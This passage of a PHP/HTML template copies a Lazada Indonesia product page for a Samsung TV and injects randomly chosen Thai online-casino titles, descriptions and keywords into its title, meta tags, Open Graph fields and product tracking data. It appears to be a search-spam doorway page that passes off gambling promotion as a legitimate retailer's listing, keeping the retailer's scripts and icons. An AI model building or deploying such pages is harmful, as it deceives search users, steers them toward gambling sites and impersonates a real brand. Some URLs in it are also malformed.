"เข้าสู่ระบบคาสิโนเว็บตรง ค่ายใหญ่ เว็บใหม่ล่าสุด ศูนย์รวมเกมคาสิโนออนไลน์ ที่ครบวงจรที่สุดในประเทศไทย มีอัตราการจ่ายเงินรางวัลที่สูงที่สุด รับโปรโมชั่นพิเศษได้ตลอดทั้งวัน",
];

$random_title = $titles[array_rand($titles)];
$random_icon = $icons[array_rand($icons)];
$random_description = $descriptions[array_rand($descriptions)];

?>
<!DOCTYPE HTML>
<html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
<head>
  <meta charset="utf-8" />
  <title><?= $go; ?> <?= $random_icon; ?> <?= $random_title; ?></title>
  <meta name="description" content="<?= $go; ?> <?= $random_description; ?>" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]' />
  <meta name="data-spm" content="12anj4u" />
  <meta name="robots" content="index, follow" />
  <meta name="og:url" content="<?= $link; ?>" />
  <meta name="og:title" content="<?= $go; ?> <?= $random_icon; ?> <?= $random_title; ?>" />
  <meta name="og:type" content="product" />
  <meta name="og:description" content="<?= $go; ?> <?= $random_description; ?>" />
  <meta name="og:image" content="https://imggalery.com/uploads/user_63/album_92/1739514300_16.jpg" />
  <link rel="manifest" href="https:https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
  <link rel="shortcut icon" href="https://imggalery.com/uploads/user_63/album_92/1739514300.png" />
  <link rel="canonical" href="<?= $link; ?>" />
  <!-- start preload -->
  <link rel="preload" href="https://imggalery.com/uploads/user_63/album_92/1739514300_16.jpg" as="image" />
  <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id" />
  <link rel="preconnect dns-prefetch" href="https://acs-m.lazada.co.id" />
  <link rel="preconnect dns-prefetch" href="https://laz-g-cdn.alicdn.com" />
  <link rel="preconnect dns-prefetch" href="https://laz-img-cdn.alicdn.com" />
  <link rel="preconnect dns-prefetch" href="https://assets.alicdn.com" />
  <link rel="preconnect dns-prefetch" href="https://aeis.alicdn.com" />
  <link rel="preconnect dns-prefetch" href="https://aeu.alicdn.com" />
  <link rel="preconnect dns-prefetch" href="https://g.alicdn.com" />
  <link rel="preconnect dns-prefetch" href="https://arms-retcode-sg.aliyuncs.com" />
  <link rel="preconnect dns-prefetch" href="https://px-intl.ucweb.com" />
  <link rel="preconnect dns-prefetch" href="https://sg.mmstat.com" />
  <link rel="preconnect dns-prefetch" href="https://img.lazcdn.comt" />
  <link rel="preconnect dns-prefetch" href="https://g.lazcdn.com" />
  <link rel="preload" href="https://g.lazcdn.com/g/woodpeckerx/jssdk??wpkReporter.js,plugins/flow.js,plugins/interface.js,plugins/blank.js" as="script" />
  <link rel="preload" href="https://g.lazcdn.com/g/lzdfe/pdp-platform/0.1.22/pc.css" as="style" />
  <link rel="preload" href="https://g.lazcdn.com/g/lzdfe/pdp-platform/0.1.22/pc.js" as="script" crossorigin />
  <link rel="preload" href="https://g.lazcdn.com/g/lzdfe/pdp-modules/1.4.4/pc-mod.css" as="style" />
  <link rel="preload" href="https://g.lazcdn.com/g/lzdfe/pdp-modules/1.4.4/pc-mod.js" as="script" crossorigin />
  <link rel="preload" href="https://aeis.alicdn.com/sd/ncpc/nc.js?t=18507" as="script" />
  <link rel="preload" href="https://g.lazcdn.com/g/alilog/mlog/aplus_int.js" as="script" />
  <link rel="preload" href="https://g.lazcdn.com/g/retcode/cloud-sdk/bl.js" as="script" crossorigin />
  <link rel="preload" href="https://g.lazcdn.com/g/lzd/assets/1.1.37/web-vitals/2.1.0/index.js" as="script" />
  <!-- end preload -->
  <link rel="stylesheet" href="https://g.lazcdn.com/g/??lzd/assets/0.0.7/dpl-buyeruikit/2.0.1/next-noreset-1.css,lzd/assets/0.0.7/dpl-buyeruikit/2.0.1/next-noreset-2.css,lazada/lazada-product-detail/1.7.4/index/index.css">
  <link rel="stylesheet" href="https://g.lazcdn.com/g/lzdfe/pdp-platform/0.1.22/pc.css" />
  <link rel="stylesheet" href="https://g.lazcdn.com/g/lzdfe/pdp-modules/1.4.4/pc-mod.css" />
  <script>
  (function() {
    try {
      if (window.aplusPageIdSetComplete || /AliApp/i.test(navigator.userAgent)) {
        return;
      }
  
      var get_cookie = function (sName) {
        var sRE = '(?:; )?' + sName + '=([^;]*);?';
        var oRE = new RegExp(sRE);
        if (oRE.test(document.cookie)) {
        var str = decodeURIComponent(RegExp['$1']) || '';
        if (str.trim().length > 0) {
          return str;
        } else {
          return '-';
        }
        } else {
          return '-';
        }
      };
      var getRand = function () {
        var page_id = get_cookie('cna') || '001';
        page_id = page_id.toLowerCase().replace(/[^a-zd]/g, '');
        page_id = page_id.substring(0, 16);
        var d = (new Date()).getTime();
        var randend = [
          page_id,
          d.toString(16)
        ].join('');
  
        for (var i = 1; i < 10; i++) {
          var _r = parseInt(Math.round(Math.random() * 10000000000), 10).toString(16);
          randend += _r;
        }
        randend = randend.substr(0, 42);
        return randend;
      };
      var pageid = getRand();
      var aq = (window.aplus_queue || (window.aplus_queue = []));
      aq.push({
        'action':'aplus.appendMetaInfo',
        'arguments':['aplus-cpvdata', {"pageid":pageid}]
      });
      aq.push({
        'action':'aplus.appendMetaInfo',
        'arguments':['aplus-exdata',{"st_page_id":pageid}]
      });
      // 兼容老版本aplus
      var gq = (window.goldlog_queue || (window.goldlog_queue = []));
      gq.push({
        'action':'goldlog.appendMetaInfo',
        'arguments':['aplus-cpvdata', {"pageid":pageid}]
      });
      gq.push({
        'action':'goldlog.appendMetaInfo',
        'arguments':['aplus-exdata',{"st_page_id":pageid}]
      });
      window.aplusPageIdSetComplete = true;
    } catch(err) {
      console.error(err);
    }
  })();
  </script>

  <script type="text/javascript">
    var timings = {
      start: Date.now(),
    };
    var dataLayer = window.dataLayer || [];
    var pdpTrackingData = "{"pdt_category":["Televisi & Video"],"pagetype":"pdp","pdt_discount":"","pdt_photo":"//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg","v_voya":1,"brand_name":"Samsung","brand_id":"842","pdt_sku":3642482616,"core":{"country":"ID","layoutType":"desktop","language":"in","currencyCode":"IDR"},"seller_name":"","pdt_simplesku":6108584955,"pdt_name":"<?= $go; ?> <?= $random_icon; ?> <?= $random_title; ?>","page":{"regCategoryId":"300300002584","xParams":"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr="},"supplier_id":"","pdt_price":"Rp2.699.000"}";
    try {
      pdpTrackingData = JSON.parse(pdpTrackingData);
      pdpTrackingData.v_voya = false;
      dataLayer.push(pdpTrackingData);
      dataLayer.push({
        gtm_enable: false,
        v_voya: false
      });
    } catch (e) {
      if (window.console) {
        console.log(e);
      }
    }
    /**
     * 支持beacon aplus script
     */
    var siteNameForApluPluginLoader = "Lazada";

  </script>

  <!-- csrf -->
  <meta name="X-CSRF-TOKEN" id="X-CSRF-TOKEN" content="eb3380311eeee" />
</head>
<body data-spm="pdp_revamp" style="overflow-y: scroll">
  <script>window.__lzd__svg__cssinject__ = true;</script>
<style>
  .svgfont {
    display: inline-block;
    width: 1em;
    height: 1em;
    fill: currentColor;
    font-size: 1em;
  }
</style>
<svg aria-hidden="true" style="position: absolute; width: 0px; height: 0px; overflow: hidden;">
  <symbol id="lazadaicon_success" viewBox="0 0 1024 1024">
    <path
      d="M512 938.666667c234.666667 0 426.666667-192 426.666667-426.666667s-192-426.666667-426.666667-426.666667-426.666667 192-426.666667 426.666667 192 426.666667 426.666667 426.666667z">
    </path>
    <path
      d="M418.133333 691.2c-8.533333 0-12.8-4.266667-21.333333-8.533333l-115.2-115.2c-12.8-12.8-12.8-29.866667 0-38.4 12.8-12.8 29.866667-12.8 38.4 0l93.866667 93.866666 256-247.466666c12.8-12.8 29.866667-12.8 38.4 0s12.8 29.866667 0 38.4l-273.066667 268.8c0 8.533333-8.533333 8.533333-17.066667 8.533333"
      fill="#FFFFFF"></path>
  </symbol>
  <symbol id="lazadaicon_cart" viewBox="0 0 1024 1024">
    <path
      d="M381.248 761.344a51.328 51.328 0 1 0 0 102.656 51.328 51.328 0 0 0 0-102.656z m-252.928-118.4v68.416h125.056l-14.88-68.448H128.32z m0-145.824v68.448h92.896l-14.88-68.448H128.32zM377.6 237.12l14.912 68.448h419.616V642.88H384.96L289.6 193.504 128.64 192 128 260.448l106.048 0.992 95.488 449.92h551.04V237.12H377.6z m458.4 575.552a51.328 51.328 0 1 1-102.72 0 51.328 51.328 0 0 1 102.72 0z">
    </path>
  </symbol>
  <symbol id="lazadaicon_wishlist" viewBox="0 0 1024 1024">
    <path
      d="M849.067 233.244c-82.49-82.488-209.067-82.488-291.556 0l-166.4 164.978 52.622 51.2 164.978-164.978c55.467-55.466 135.111-55.466 189.156 0 45.51 45.512 61.155 128 0 189.156l-72.534 72.533L509.156 748.09 292.978 546.133 220.444 473.6c-49.777-56.889-41.244-146.489 0-189.156 51.2-51.2 132.267-52.622 184.89-4.266l51.2-51.2c-81.067-76.8-209.067-75.378-287.29 2.844-65.422 65.422-82.488 200.534-1.422 290.134l75.378 75.377 265.956 248.89 265.955-248.89 73.956-73.955c91.022-89.6 71.11-219.022 0-290.134z">
    </path>
  </symbol>
  <symbol id="lazadaicon_chat" viewBox="0 0 1024 1024">
    <path
      d="M92.471652 820.758261l165.286957-123.547826h666.935652V136.993391H92.449391v683.742609zM0 887.318261l92.471652-66.56v-134.455652L0 741.62087V44.521739h1017.143652v745.160348H283.692522L0 989.807304V887.318261z">
    </path>
    <path
      d="M261.988174 275.70087h477.762783v92.471652H261.988174zM261.988174 445.217391h261.988174v92.471652H261.988174z">
    </path>
  </symbol>
  <symbol id="lazadaicon_store" viewBox="0 0 1024 1024">
    <path
      d="M223.833043 141.868522l180.936348 1.669565h332.221218l92.471652-92.471652H405.504L160.723478 48.88487 19.945739 316.549565a142.06887 142.06887 0 0 0 95.654957 188.66087 158.118957 158.118957 0 0 0 134.322087-24.998957l26.37913-24.197565 27.469913 23.863652a159.209739 159.209739 0 0 0 90.445913 28.026435 159.432348 159.432348 0 0 0 111.304348-45.100522l2.381913-2.337391 2.381913 2.337391a159.432348 159.432348 0 0 0 111.304348 45.100522c30.764522 0 59.503304-8.681739 83.878956-23.752348l35.617392-29.874087 34.148174 30.430609a158.029913 158.029913 0 0 0 128.289391 20.813913 142.870261 142.870261 0 0 0 96.478609-188.994783l-92.249044-173.367652-68.608 66.404174 74.48487 139.976348a50.398609 50.398609 0 0 1-34.059131 66.671304 65.958957 65.958957 0 0 1-67.673043-21.370435l-68.741565-81.92-71.123479 79.872a67.072 67.072 0 0 1-50.44313 22.639305 66.982957 66.982957 0 0 1-47.972174-20.034783l-65.714087-66.404174-65.736348 66.426435c-12.644174 12.777739-29.606957 20.012522-47.949913 20.012522a67.049739 67.049739 0 0 1-49.775304-21.904696l-70.010435-76.354782-67.940174 78.202434a65.936696 65.936696 0 0 1-66.960696 20.524522 49.597217 49.597217 0 0 1-33.391304-65.869913l117.693217-208.161391z">
    </path>
    <path d="M184.943304 876.744348V445.217391H92.471652v523.976348h832.200348V445.217391h-92.449391v431.526957z">
    </path>
  </symbol>
  <symbol id="lazadaicon_arrowRight" viewBox="0 0 1024 1024">
    <path
      d="M311.466667 814.933333l68.266666 59.733334 332.8-366.933334-332.8-358.4-64 59.733334 273.066667 298.666666z">
    </path>
  </symbol>
  <symbol id="lazadaicon_arrowBack" viewBox="0 0 1024 1024">
    <path
      d="M426.666667 507.733333L763.733333 170.666667l-85.333333-85.333334L256 507.733333l4.266667 4.266667 422.4 422.4 85.333333-85.333333-341.333333-341.333334z"
      fill="#808080"></path>
  </symbol>
  <symbol id="lazadaicon_pause" viewBox="0 0 1024 1024">
    <path d="M187.733333 102.4h256v819.2H187.733333zM597.333333 102.4h256v819.2H597.333333z"></path>
  </symbol>
  <symbol id="lazadaicon_start" viewBox="0 0 1024 1024">
    <path
      d="M236.249425 10.759014l591.395068 460.126685a42.082192 42.082192 0 0 1 0.490959 66.055013l-591.395068 474.266302A42.082192 42.082192 0 0 1 168.328767 978.396932V43.989918A42.082192 42.082192 0 0 1 236.249425 10.759014z">
    </path>
  </symbol>
  <symbol id="lazadaicon_phone" viewBox="0 0 1024 1024">
    <path
      d="M185.6 21.333333v85.333334h567.466667v29.866666H185.6v874.666667h652.8V21.333333H185.6z m567.466667 904.533334H270.933333v-123.733334h482.133334v123.733334z m0-206.933334H270.933333V221.866667h482.133334v497.066666z"
      fill=""></path>
    <path d="M512 864m-42.666667 0a42.666667 42.666667 0 1 0 85.333334 0 42.666667 42.666667 0 1 0-85.333334 0Z"
      fill=""></path>
  </symbol>
  <symbol id="lazadaicon_sizeChart" viewBox="0 0 1613 1024">
    <path
      d="M102.4 68.267h1405.673v893.672H102.4V68.267z m89.988 803.685h1225.697V158.255H192.388v713.697z m294.788 0h-89.988V425.115h89.988v446.837z m363.054 0h-89.988V605.09h89.988v266.86z m359.952 0h-89.988V425.115h89.988v446.837z">
    </path>
  </symbol>
  <symbol id="lazadaicon_address" viewBox="0 0 1024 1024">
    <path d="M138.971 980.114H43.886V190.171h412.038v95.086H138.97V885.03h599.772V694.857h95.086v285.257H138.97z">
    </path>
    <path
      d="M980.114 343.771c0 65.829-21.943 124.343-70.704 170.667-31.696 31.695-68.267 53.638-112.153 63.39l-351.086 65.83c-9.752 2.437-19.504-7.315-17.066-17.068l70.705-341.333c0-2.438 2.438-7.314 2.438-7.314 9.752-41.448 31.695-75.581 63.39-107.276 46.324-48.762 104.838-70.705 170.667-70.705s124.343 24.38 170.666 73.143c48.762 46.324 73.143 102.4 73.143 170.666z m-190.171-58.514C770.438 265.752 748.495 256 721.676 256c-26.819 0-48.762 9.752-65.828 26.819-19.505 19.505-26.82 41.448-26.82 68.267 0 26.819 9.753 48.762 29.258 68.266 19.504 19.505 41.447 29.258 68.266 29.258 26.82 0 48.762-9.753 68.267-26.82 19.505-19.504 26.82-41.447 26.82-65.828-2.439-29.257-12.191-51.2-31.696-70.705z">
    </path>
  </symbol>
  <symbol id="lazadaicon_warn" viewBox="0 0 1024 1024">
    <path
      d="M576 832h-128v-128h128v128z m0-226.133333h-128v-384h128v384zM512 0C230.4 0 0 230.4 0 512s230.4 512 512 512 512-230.4 512-512S793.6 0 512 0z"
      fill="#FF9000"></path>
  </symbol>
  <symbol id="lazadaicon_pin" viewBox="0 0 1024 1024">
    <path
      d="M512 544c64 0 118.4-51.2 118.4-115.2S576 313.6 512 313.6s-118.4 51.2-118.4 115.2S448 544 512 544z m0 345.6l-25.6-25.6c-28.8-28.8-268.8-297.6-268.8-444.8 0-156.8 131.2-284.8 291.2-284.8s291.2 128 291.2 284.8c0 147.2-240 416-268.8 444.8l-19.2 25.6z">
    </path>
  </symbol>
  <symbol id="lazadaicon_share" viewBox="0 0 1024 1024">
    <path
      d="M809.344 695.369143c-44.580571 0-85.101714 17.792-113.481143 49.243428L340.553143 535.332571a101.193143 101.193143 0 0 0 0-49.243428l355.309714-207.908572a152.246857 152.246857 0 0 0 113.481143 50.614858c86.473143-1.371429 151.314286-67.035429 152.667429-154.569143C960.658286 86.674286 895.817143 19.657143 809.344 18.285714c-86.454857 1.371429-152.667429 68.388571-154.002286 155.940572 0 9.563429 1.334857 19.145143 2.688 28.708571L305.426286 408.137143c-28.379429-31.451429-67.547429-51.968-114.834286-51.968-86.473143 1.353143-152.685714 67.017143-154.020571 154.569143 1.353143 87.533714 67.547429 153.197714 154.020571 154.550857 44.580571 0 86.454857-20.516571 114.834286-51.968l352.603428 206.537143c-1.334857 9.581714-2.688 19.163429-2.688 30.098285 1.334857 87.552 67.547429 153.197714 154.002286 154.569143 86.473143-1.371429 151.314286-67.017143 152.667429-154.569143-1.353143-87.533714-66.194286-153.197714-152.667429-154.569142z">
    </path>
  </symbol>
  <symbol id="lazadaicon_largeShare" viewBox="0 0 1024 1024">
    <path
      d="M768 686.933333c-34.133333 0-59.733333 12.8-85.333333 34.133334l-302.933334-179.2c4.266667-8.533333 4.266667-17.066667 4.266667-29.866667 0-8.533333 0-21.333333-4.266667-29.866667L682.666667 307.2c21.333333 21.333333 51.2 34.133333 85.333333 34.133333 72.533333 0 128-55.466667 128-128s-55.466667-128-128-128-128 55.466667-128 128c0 8.533333 0 21.333333 4.266667 29.866667L341.333333 418.133333C320 396.8 290.133333 384 256 384c-72.533333 0-128 55.466667-128 128s55.466667 128 128 128c34.133333 0 64-12.8 85.333333-34.133333l302.933334 179.2c-4.266667 8.533333-4.266667 17.066667-4.266667 29.866666 0 68.266667 55.466667 123.733333 123.733333 123.733334s123.733333-55.466667 123.733334-123.733334c4.266667-68.266667-51.2-128-119.466667-128z"
      fill="#9E9E9E"></path>
  </symbol>
  <symbol id="lazadaicon_notes" viewBox="0 0 1024 1024">
    <path
      d="M512 0c282.624 0 512 229.376 512 512s-229.376 512-512 512S0 794.624 0 512 229.376 0 512 0zM460.8 768h102.4V460.8H460.8v307.2z m0-409.6h102.4V256H460.8v102.4z"
      fill="#2196F3"></path>
  </symbol>
  <symbol id="lazadaicon_question" viewBox="0 0 1024 1024">
    <path
      d="M170.666667 85.333333c-46.933333 0-85.333333 38.4-85.333334 85.333334v768l170.666667-170.666667h597.333333c46.933333 0 85.333333-38.4 85.333334-85.333333V170.666667c0-46.933333-38.4-85.333333-85.333334-85.333334H170.666667z m512 320c0 34.133333-4.266667 64-17.066667 89.6-12.8 25.6-25.6 42.666667-46.933333 59.733334l59.733333 46.933333-34.133333 38.4-76.8-59.733333c-8.533333 4.266667-21.333333 4.266667-34.133334 4.266666-29.866667 0-55.466667-8.533333-76.8-21.333333s-38.4-34.133333-51.2-59.733333c-12.8-29.866667-21.333333-59.733333-21.333333-93.866667v-21.333333c0-34.133333 4.266667-64 17.066667-93.866667 12.8-25.6 29.866667-46.933333 51.2-59.733333s51.2-21.333333 81.066666-21.333334 55.466667 8.533333 76.8 21.333334 38.4 34.133333 51.2 59.733333 21.333333 59.733333 21.333334 93.866667v17.066666z m-64-17.066666c0-38.4-8.533333-72.533333-21.333334-93.866667-17.066667-21.333333-38.4-29.866667-64-29.866667s-46.933333 12.8-64 34.133334c-12.8 21.333333-21.333333 51.2-21.333333 89.6v21.333333c0 38.4 8.533333 68.266667 21.333333 89.6s38.4 34.133333 64 34.133333c29.866667 0 51.2-8.533333 64-29.866666 12.8-21.333333 21.333333-51.2 21.333334-93.866667v-21.333333z"
      fill="#1A9CB7"></path>
  </symbol>
  <symbol id="lazadaicon_answer" viewBox="0 0 1024 1024">
    <path
      d="M853.333333 85.333333H170.666667c-46.933333 0-85.333333 38.4-85.333334 85.333334v768l170.666667-170.666667h597.333333c46.933333 0 85.333333-38.4 85.333334-85.333333V170.666667c0-46.933333-38.4-85.333333-85.333334-85.333334z m-260.266666 439.466667h-140.8l-29.866667 85.333333H358.4l136.533333-362.666666h55.466667l136.533333 362.666666h-64l-29.866666-85.333333zM469.333333 473.6h106.666667l-51.2-149.333333-55.466667 149.333333z"
      fill="#9E9E9E"></path>
  </symbol>
  <symbol id="lazadaicon_questionSymbol" viewBox="0 0 1024 1024">
    <path
      d="M328 723.2l-121.6 121.6c-12.8 12.8-33.6 3.2-33.6-14.4V256c0-46.4 38.4-83.2 83.2-83.2h512c46.4 0 83.2 38.4 83.2 83.2v384c0 46.4-38.4 83.2-83.2 83.2H328z m-22.4-33.6c3.2-3.2 9.6-6.4 14.4-6.4h448c24 0 44.8-19.2 44.8-44.8V256c0-24-19.2-44.8-44.8-44.8H256c-24 0-44.8 19.2-44.8 44.8v528l94.4-94.4z"
      fill="#979797"></path>
    <path
      d="M507.2 628.8c-14.4 0-27.2-11.2-27.2-27.2 0-14.4 11.2-27.2 27.2-27.2 14.4 0 27.2 11.2 27.2 27.2-1.6 16-12.8 27.2-27.2 27.2zM588.8 438.4L564.8 464c-19.2 19.2-30.4 35.2-30.4 75.2H480v-12.8c0-28.8 12.8-56 32-75.2L544 416c9.6-9.6 16-22.4 16-36.8C560 350.4 536 326.4 507.2 326.4c-28.8 0-52.8 24-52.8 52.8H400a107.2 107.2 0 0 1 214.4 0c-1.6 22.4-11.2 44.8-25.6 59.2z"
      fill="#9E9E9E"></path>
  </symbol>
  <symbol id="lazadaicon_filter" viewBox="0 0 1024 1024">
    <path
      d="M918.75555522 201.95555522c-4.266667-8.533333-17.066667-17.066667-25.6-17.066666H129.42222222c-12.8 0-21.333333 8.533333-25.6 17.066666-4.266667 12.8-4.266667 25.6 4.266667 34.133334L411.02222222 611.55555522v256c0 17.066667 12.8 29.866667 29.866667 29.866667 17.066667 0 29.866667-12.8 29.866666-29.866667v-277.333333l-277.333333-341.333333H824.88888922l-277.333334 341.333333V867.55555522c0 17.066667 12.8 29.866667 29.866667 29.866667s29.866667-12.8 29.866667-29.866667v-256L910.22222222 236.08888922c12.8-8.533333 12.8-21.333333 8.533333-34.133334">
    </path>
  </symbol>
  <symbol id="lazadaicon_sort" viewBox="0 0 1024 1024">
    <path
      d="M887.466667 725.333333l-192 192-12.8 12.8c-4.266667 4.266667-12.8 8.533333-17.066667 8.533334-8.533333 0-12.8-4.266667-21.333333-8.533334l-8.533334-8.533333-192-192c-8.533333-12.8-8.533333-29.866667 0-38.4l12.8-12.8c12.8-12.8 34.133333-8.533333 42.666667 4.266667l128 128v-345.6c0-21.333333 17.066667-38.4 38.4-38.4s38.4 17.066667 38.4 38.4V810.666667l128-132.266667c8.533333-12.8 29.866667-12.8 38.4 0l12.8 12.8c12.8 8.533333 17.066667 21.333333 4.266667 34.133333z m-320-375.466666c-12.8 12.8-34.133333 8.533333-42.666667-4.266667l-128-128v345.6c0 21.333333-17.066667 38.4-38.4 38.4s-38.4-17.066667-38.4-38.4V217.6l-128 128c-8.533333 12.8-29.866667 12.8-38.4 0l-17.066667-8.533333c-8.533333-12.8-12.8-25.6 0-38.4l192-192 8.533334-12.8c8.533333-4.266667 12.8-8.533333 21.333333-8.533334s12.8 4.266667 21.333333 8.533334l4.266667 8.533333 196.266667 192c8.533333 12.8 8.533333 29.866667 0 38.4l-12.8 17.066667z">
    </path>
  </symbol>
  <symbol id="lazadaicon_options" viewBox="0 0 1024 1024">
    <path
      d="M512 682.666667c46.933333 0 85.333333 38.4 85.333333 85.333333s-38.4 85.333333-85.333333 85.333333-85.333333-38.4-85.333333-85.333333 38.4-85.333333 85.333333-85.333333z m0-85.333334c-46.933333 0-85.333333-38.4-85.333333-85.333333s38.4-85.333333 85.333333-85.333333 85.333333 38.4 85.333333 85.333333-38.4 85.333333-85.333333 85.333333z m0-256c-46.933333 0-85.333333-38.4-85.333333-85.333333s38.4-85.333333 85.333333-85.333333 85.333333 38.4 85.333333 85.333333-38.4 85.333333-85.333333 85.333333z">
    </path>
  </symbol>
  <symbol id="lazadaicon_like" viewBox="0 0 1024 1024">
    <path
      d="M136.533333 849.066667h140.8v-426.666667H136.533333v426.666667z m785.066667-388.266667c0-38.4-34.133333-72.533333-72.533333-72.533333h-226.133334l34.133334-162.133334V213.333333c0-12.8-4.266667-29.866667-17.066667-38.4l-38.4-38.4-230.4 234.666667c-12.8 12.8-21.333333 34.133333-21.333333 51.2v354.133333c0 38.4 34.133333 72.533333 72.533333 72.533334h320c29.866667 0 55.466667-17.066667 64-42.666667l106.666667-251.733333c4.266667-8.533333 4.266667-17.066667 4.266666-25.6v-68.266667h4.266667z"
      fill="#9E9E9E"></path>
  </symbol>
  <symbol id="lazadaicon_facebook" viewBox="0 0 1024 1024">
    <path
      d="M548.864 1024h-73.728C212.992 1024 0 811.008 0 548.864v-73.728C0 212.992 212.992 0 475.136 0h73.728C811.008 0 1024 212.992 1024 475.136v73.728C1024 811.008 811.008 1024 548.864 1024z"
      fill="#3B5998"></path>
    <path
      d="M534.528 778.24h-110.592V512H368.64v-92.16h55.296v-55.296c0-75.776 30.72-118.784 118.784-118.784h73.728v92.16h-45.056c-34.816 0-36.864 12.288-36.864 36.864v45.056h83.968l-10.24 92.16h-73.728v266.24z"
      fill="#FFFFFF"></path>
  </symbol>
  <symbol id="lazadaicon_soldbyLAZ" viewBox="0 0 1024 1024">
    <path d="M512 512m-512 0a512 512 0 1 0 1024 0 512 512 0 1 0-1024 0Z" fill="#F37226"></path>
    <path
      d="M625.777778 341.333333h208.782222l-133.12 213.617778a249.457778 249.457778 0 0 0-28.444444-12.515555L568.888889 312.888889h-33.848889l-178.631111 398.222222h32.995555l43.235556-97.848889 6.257778-14.222222a223.573333 223.573333 0 0 1 131.413333-42.097778 253.724444 253.724444 0 0 1 115.484445 22.755556l-70.542223 113.777778 8.248889 18.204444h222.151111l13.653334-30.151111h-201.671111l215.324444-341.333333V312.888889h-260.266667z m-55.182222 185.457778a287.288889 287.288889 0 0 0-110.08 23.893333l2.56-5.688888L551.537778 341.333333l83.626666 190.293334a309.191111 309.191111 0 0 0-64.853333-4.835556z"
      fill="#FFFFFF"></path>
    <path
      d="M850.488889 718.222222h-231.537778l-11.662222-25.884444 68.266667-109.795556a256 256 0 0 0-104.96-18.488889 214.755556 214.755556 0 0 0-125.724445 39.537778l-50.915555 113.777778h-48.64l185.173333-412.444445h42.666667l103.822222 230.968889c7.111111 2.844444 14.506667 5.688889 21.617778 9.102223l122.88-197.404445h-200.817778l-19.057778-42.666667h278.471111v38.115556l-209.635555 330.808889h199.111111z m-222.435556-14.222222h213.048889l7.111111-15.928889h-203.377777l221.013333-350.435555v-17.635556h-242.346667l6.542222 14.222222h217.031112l-142.222223 229.831111-5.688889-2.844444a278.471111 278.471111 0 0 0-28.444444-11.946667h-2.844444l-1.422223-2.844444-100.977777-225.564445H540.444444l-170.666666 384h17.351111l49.777778-110.648889a229.831111 229.831111 0 0 1 135.68-43.52 261.404444 261.404444 0 0 1 118.613333 23.324445l7.111111 3.413333-72.817778 116.906667z m-181.76-139.377778l105.244445-239.786666 95.573333 217.6-13.368889-2.844445a316.017778 316.017778 0 0 0-63.146666-5.688889 284.444444 284.444444 0 0 0-107.52 23.04z m105.244445-204.515555l-77.937778 177.208889a308.337778 308.337778 0 0 1 96.711111-17.635556 300.942222 300.942222 0 0 1 52.906667 3.697778zM181.76 312.888889H151.04v398.222222h186.88l12.8-29.013333H181.76V312.888889z"
      fill="#FFFFFF"></path>
    <path
      d="M341.333333 718.222222H142.222222v-412.444444h46.648889v369.777778h172.942222z m-184.32-14.222222h174.933334l6.826666-14.791111H174.648889v-369.777778h-16.497778z"
      fill="#FFFFFF"></path>
  </symbol>
  <symbol id="lazadaicon_officialBadge" viewBox="0 0 1024 1024">
    <path d="M512 1024c281.6 0 512-230.4 512-512S793.6 0 512 0 0 230.4 0 512s230.4 512 512 512z" fill="#CE0909"></path>
    <path
      d="M853.333333 785.066667v8.533333c0 8.533333-8.533333 17.066667-17.066666 17.066667h-8.533334l-110.933333-34.133334-25.6 110.933334c0 8.533333-8.533333 17.066667-17.066667 17.066666s-17.066667-8.533333-17.066666-8.533333l-128-256h-42.666667l-119.466667 247.466667c0 8.533333-8.533333 8.533333-17.066666 8.533333s-17.066667-8.533333-17.066667-17.066667l-25.6-102.4-110.933333 42.666667c-8.533333 0-17.066667 0-25.6-8.533333v-17.066667l128-256c-34.133333-42.666667-51.2-93.866667-51.2-153.6 0-145.066667 119.466667-256 264.533333-256s256 110.933333 256 256c0 51.2-17.066667 102.4-51.2 145.066667l136.533333 256zM512 580.266667c110.933333 0 204.8-85.333333 204.8-196.266667 0-110.933333-93.866667-196.266667-204.8-196.266667-110.933333 0-204.8 85.333333-204.8 196.266667 0 110.933333 85.333333 196.266667 204.8 196.266667zM546.133333 341.333333h93.866667l-76.8 59.733334 25.6 93.866666-76.8-51.2-85.333333 51.2 25.6-93.866666-76.8-59.733334h93.866666l34.133334-85.333333 42.666666 85.333333z"
      fill="#FFFFFF"></path>
  </symbol>
  <symbol id="lazadaicon_taobaoBadge" viewBox="0 0 1024 1024">
    <path d="M512 0C230.4 0 0 230.4 0 512s230.4 512 512 512 512-230.4 512-512-230.4-512-512-512z" fill="#FF440B"></path>
    <path
      d="M256 264.533333c34.133333 0 68.266667 25.6 68.266667 59.733334 0 34.133333-25.6 59.733333-68.266667 59.733333-34.133333 0-68.266667-25.6-68.266667-59.733333 0-34.133333 34.133333-59.733333 68.266667-59.733334zM307.2 614.4c-17.066667 51.2-17.066667 34.133333-85.333333 179.2l-93.866667-59.733333s110.933333-102.4 136.533333-145.066667c17.066667-42.666667-25.6-76.8-25.6-76.8l-76.8-42.666667 42.666667-59.733333c59.733333 42.666667 59.733333 42.666667 102.4 85.333333 25.6 25.6 17.066667 68.266667 0 119.466667z"
      fill="#FFFFFF"></path>
    <path
      d="M844.8 682.666667c-17.066667 179.2-256 110.933333-256 110.933333l17.066667-51.2 51.2 8.533333c102.4 8.533333 93.866667-85.333333 93.866666-85.333333v-256c0-93.866667-93.866667-110.933333-256-51.2l42.666667 8.533333c0 8.533333-17.066667 25.6-34.133333 51.2h221.866666v42.666667H597.333333v59.733333h128v42.666667H597.333333v93.866667l51.2-25.6-8.533333-25.6 59.733333-17.066667 51.2 119.466667-76.8 25.6-17.066666-42.666667c-34.133333 25.6-93.866667 59.733333-213.333334 51.2-128 0-93.866667-136.533333-93.866666-136.533333h85.333333c0 17.066667-8.533333 51.2 0 68.266666 17.066667 8.533333 34.133333 8.533333 51.2 8.533334h8.533333V580.266667H366.933333v-51.2h128v-51.2h-34.133333c-34.133333 25.6-59.733333 51.2-59.733333 51.2l-34.133334-34.133334c25.6-25.6 51.2-68.266667 68.266667-102.4-8.533333 8.533333-25.6 17.066667-42.666667 17.066667-8.533333 17.066667-25.6 42.666667-42.666666 